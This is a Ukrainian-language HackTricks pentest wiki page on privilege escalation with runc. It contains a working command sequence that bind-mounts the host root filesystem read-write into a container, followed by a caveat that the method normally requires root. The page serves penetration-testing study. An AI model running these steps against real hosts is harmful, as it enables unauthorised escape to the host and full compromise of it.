# Підвищення привілеїв RunC

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви хочете дізнатися більше про **runc**, перегляньте таку сторінку:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Якщо ви виявили, що `runc` встановлено на хості, можливо, ви зможете **запустити контейнер, змонтувавши кореневу папку / хоста**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Це не завжди спрацює, оскільки стандартна операція runc полягає у запуску від імені root, тому запуск від імені непривілейованого користувача просто неможливий (якщо у вас немає rootless configuration). Встановлювати rootless configuration як стандартну зазвичай не варто, оскільки всередині rootless containers є чимало обмежень, які не застосовуються поза rootless containers.

{{#include ../../banners/hacktricks-training.md}}
